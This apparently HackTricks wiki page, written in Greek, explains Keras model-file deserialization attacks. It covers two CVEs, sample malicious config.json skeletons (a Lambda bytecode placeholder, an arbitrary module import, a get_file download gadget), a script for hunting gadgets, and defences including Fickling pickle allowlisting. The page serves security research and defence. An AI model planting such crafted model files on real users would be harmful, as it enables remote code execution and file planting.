# Keras Αποσειριοποίηση Μοντέλου RCE και Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

Αυτή η σελίδα συνοψίζει πρακτικές τεχνικές εκμετάλλευσης κατά της pipeline αποσειριοποίησης μοντέλου Keras, εξηγεί τα εσωτερικά του εγγενούς μορφότυπου .keras και την επιφάνεια επίθεσης, και παρέχει ένα κιτ εργαλείων για ερευνητές για την εύρεση Model File Vulnerabilities (MFVs) και post-fix gadgets.

## .keras model format internals

Ένα αρχείο .keras είναι ένα ZIP αρχείο που περιέχει τουλάχιστον:
- metadata.json – γενικές πληροφορίες (π.χ., Keras έκδοση)
- config.json – αρχιτεκτονική μοντέλου (κύρια επιφάνεια επίθεσης)
- model.weights.h5 – βάρη σε HDF5

Το config.json καθοδηγεί την αναδρομική αποσειριοποίηση: το Keras εισάγει modules, επιλύει classes/functions και αναδομεί layers/objects από attacker-controlled dictionaries.

Παράδειγμα αποσπάσματος για ένα Dense layer object:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Deserialization εκτελεί:
- Module import and symbol resolution from module/class_name keys
- from_config(...) or constructor invocation with attacker-controlled kwargs
- Recursion into nested objects (activations, initializers, constraints, etc.)

Ιστορικά, αυτό παρείχε σε έναν επιτιθέμενο που δημιουργεί το config.json τρεις βασικές δυνατότητες:
- Έλεγχος των modules που εισάγονται
- Έλεγχος των classes/functions που επιλύονται
- Έλεγχος των kwargs που περνιούνται σε constructors/from_config

## CVE-2024-3660 – Lambda-layer bytecode RCE

Βασική αιτία:
- Lambda.from_config() used python_utils.func_load(...) which base64-decodes and calls marshal.loads() on attacker bytes; Python unmarshalling can execute code.

Ιδέα εκμετάλλευσης (απλοποιημένο payload στο config.json):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
Μέτρα αντιμετώπισης:
- Το Keras επιβάλλει safe_mode=True ως προεπιλογή. Σειριοποιημένες Python συναρτήσεις στο Lambda μπλοκάρονται εκτός αν ο χρήστης ρητά απενεργοποιήσει με safe_mode=False.

Σημειώσεις:
- Legacy formats (older HDF5 saves) ή παλαιότερα codebases μπορεί να μην εφαρμόζουν σύγχρονους ελέγχους, οπότε επιθέσεις τύπου “downgrade” μπορούν να εξακολουθούν να ισχύουν όταν τα θύματα χρησιμοποιούν παλαιότερους loaders.

## CVE-2025-1550 – Αυθαίρετη εισαγωγή module σε Keras ≤ 3.8

Αιτία ρίζας:
- Η _retrieve_class_or_fn χρησιμοποιούσε ανεξέλεγκτο importlib.import_module() με module strings που ελέγχονταν από επιτιθέμενο μέσω config.json.
- Επίπτωση: Αυθαίρετη εισαγωγή οποιουδήποτε εγκατεστημένου module (ή module που έχει τοποθετήσει ο επιτιθέμενος στο sys.path). Ο κώδικας κατά το import εκτελείται, και στη συνέχεια η κατασκευή του αντικειμένου συμβαίνει με kwargs του επιτιθέμενου.

Ιδέα εκμετάλλευσης:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Βελτιώσεις ασφάλειας (Keras ≥ 3.9):
- Module allowlist: οι εισαγωγές περιορίζονται σε επίσημα modules του οικοσυστήματος: keras, keras_hub, keras_cv, keras_nlp
- Safe mode default: safe_mode=True μπλοκάρει το unsafe Lambda serialized-function loading
- Basic type checking: τα deserialized αντικείμενα πρέπει να ταιριάζουν με τους αναμενόμενους τύπους

## Επιφάνεια gadget μετά τη διόρθωση εντός allowlist

Ακόμα και με allowlisting και safe mode, παραμένει ευρεία επιφάνεια ανάμεσα στα επιτρεπόμενα Keras callables. Για παράδειγμα, το keras.utils.get_file μπορεί να κατεβάσει αυθαίρετα URLs σε τοποθεσίες που επιλέγει ο χρήστης.

Gadget via Lambda that references an allowed function (not serialized Python bytecode):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Σημαντικός περιορισμός:
- Lambda.call() προθέτει το input tensor ως πρώτο θεσιακό όρισμα όταν καλεί το target callable. Τα επιλεγμένα gadgets πρέπει να αντέχουν ένα επιπλέον θεσιακό arg (ή να δέχονται *args/**kwargs). Αυτό περιορίζει ποιες συναρτήσεις είναι βιώσιμες.

Potential impacts of allowlisted gadgets:
- Αυθαίρετο download/write (path planting, config poisoning)
- Network callbacks/SSRF-like effects ανάλογα με το environment
- Chaining σε code execution αν τα εγγραμμένα paths εισαχθούν/εκτελεστούν αργότερα ή προστεθούν στο PYTHONPATH, ή αν υπάρχει writable execution-on-write location

## Εργαλειοθήκη ερευνητή

1) Συστηματική ανακάλυψη gadgets στα επιτρεπόμενα modules

Απαριθμήστε τους υποψήφιους callables στα keras, keras_nlp, keras_cv, keras_hub και δώστε προτεραιότητα σε εκείνους με file/network/process/env side effects.
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
2) Άμεση δοκιμή αποσειριοποίησης (δεν απαιτείται .keras archive)

Τροφοδοτήστε κατασκευασμένα dicts απευθείας στους Keras deserializers για να μάθετε τις αποδεκτές params και να παρατηρήσετε παρενέργειες.
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) Διασταυρωμένη δοκιμή εκδόσεων και μορφών

Keras υπάρχει σε πολλαπλές codebases/era με διαφορετικούς μηχανισμούς προστασίας και μορφές:
- TensorFlow built-in Keras: tensorflow/python/keras (legacy, slated for deletion)
- tf-keras: maintained separately
- Multi-backend Keras 3 (official): introduced native .keras

Επαναλάβετε τα tests σε όλες τις codebases και μορφές (.keras vs legacy HDF5) για να αποκαλύψετε regressions ή ελλείποντες μηχανισμούς προστασίας.

## Αμυντικές συστάσεις

- Θεωρήστε τα αρχεία μοντέλων ως μη αξιόπιστη είσοδο. Φορτώνετε μοντέλα μόνο από αξιόπιστες πηγές.
- Κρατήστε το Keras ενημερωμένο· χρησιμοποιήστε Keras ≥ 3.9 για να επωφεληθείτε από allowlisting και ελέγχους τύπων.
- Μην ρυθμίζετε safe_mode=False κατά τη φόρτωση μοντέλων εκτός αν εμπιστεύεστε πλήρως το αρχείο.
- Σκεφτείτε να εκτελείτε την αποσειριοποίηση σε sandboxed, least-privileged περιβάλλον χωρίς network egress και με περιορισμένη πρόσβαση στο filesystem.
- Επιβάλετε allowlists/signatures για τις πηγές μοντέλων και έλεγχο ακεραιότητας όπου είναι δυνατό.

## Allowlisting εισαγωγών pickle για μοντέλα AI/ML (Fickling)

Πολλές μορφές μοντέλων AI/ML (PyTorch .pt/.pth/.ckpt, joblib/scikit-learn, older TensorFlow artifacts, κ.λπ.) ενσωματώνουν δεδομένα Python pickle. Οι επιτιθέμενοι συστηματικά καταχρώνται τις pickle GLOBAL εισαγωγές και τους constructors αντικειμένων για να επιτύχουν RCE ή αντικατάσταση μοντέλου κατά τη φόρτωση. Ανιχνευτές βάσει blacklist συχνά χάνουν νέες ή μη καταγεγραμμένες επικίνδυνες εισαγωγές.

Μια πρακτική fail-closed άμυνα είναι να προσαρτήσετε τον deserializer του Python pickle και να επιτρέπετε μόνο ένα ελεγμένο σύνολο αβλαβών εισαγωγών σχετικών με ML κατά το unpickling. Το Fickling της Trail of Bits υλοποιεί αυτή την πολιτική και παρέχει μια επιμελημένη ML import allowlist χτισμένη από χιλιάδες δημόσια Hugging Face pickles.

Μοντέλο ασφάλειας για “ασφαλείς” εισαγωγές (διαισθήσεις αποσταγμένες από έρευνα και πρακτική): τα εισαγόμενα σύμβολα που χρησιμοποιούνται από ένα pickle πρέπει ταυτόχρονα:
- Να μην εκτελούν κώδικα ή να προκαλούν εκτέλεση (no compiled/source code objects, shelling out, hooks, κ.λπ.)
- Να μην λαμβάνουν/ορίζουν αυθαίρετα attributes ή items
- Να μην εισάγουν ή να αποκτούν αναφορές σε άλλα Python αντικείμενα από τη pickle VM
- Να μην ενεργοποιούν δευτερεύοντες deserializers (π.χ., marshal, nested pickle), έστω και έμμεσα

Ενεργοποιήστε τις προστασίες του Fickling όσο το δυνατόν νωρίτερα στην εκκίνηση της διεργασίας ώστε οποιεσδήποτε φορτώσεις pickle που εκτελούνται από frameworks (torch.load, joblib.load, κ.λπ.) να ελέγχονται:
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
Λειτουργικές συμβουλές:
- Μπορείτε προσωρινά να απενεργοποιήσετε/επαναενεργοποιήσετε τα hooks όπου χρειάζεται:
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- Εάν ένα γνωστό-καλό μοντέλο μπλοκάρεται, επεκτείνετε την allowlist για το περιβάλλον σας αφού ελέγξετε τα σύμβολα:
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Το Fickling εκθέτει επίσης γενικούς μηχανισμούς προστασίας σε χρόνο εκτέλεσης αν προτιμάτε πιο λεπτομερή έλεγχο:
- fickling.always_check_safety() to enforce checks for all pickle.load()
- with fickling.check_safety(): for scoped enforcement
- fickling.load(path) / fickling.is_likely_safe(path) for one-off checks

- Προτιμήστε μη-pickle μορφές μοντέλων όταν είναι δυνατό (π.χ., SafeTensors). Αν πρέπει να αποδεχτείτε pickle, τρέξτε τους loaders με ελάχιστα προνόμια, χωρίς εξερχόμενη σύνδεση δικτύου, και εφαρμόστε την allowlist.

Αυτή η στρατηγική που θέτει την allowlist ως πρώτη γραμμή άμυνας μπλοκάρει εμφανώς κοινές διαδρομές εκμετάλλευσης pickle σε ML, διατηρώντας ταυτόχρονα υψηλή συμβατότητα. Στο benchmark του ToB, το Fickling σήμανε 100% των συνθετικών κακόβουλων αρχείων και επέτρεψε ~99% των καθαρών αρχείων από κορυφαία Hugging Face repos.

## Αναφορές

- [Hunting Vulnerabilities in Keras Model Deserialization (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [Keras PR #20751 – Added checks to serialization](https://github.com/keras-team/keras/pull/20751)
- [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [Trail of Bits blog – Fickling’s new AI/ML pickle file scanner](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [Fickling – Securing AI/ML environments (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [Fickling pickle scanning benchmark corpus](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [Picklescan](https://github.com/mmaitre314/picklescan), [ModelScan](https://github.com/protectai/modelscan), [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [Sleepy Pickle attacks background](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [SafeTensors project](https://github.com/safetensors/safetensors)

{{#include ../../banners/hacktricks-training.md}}
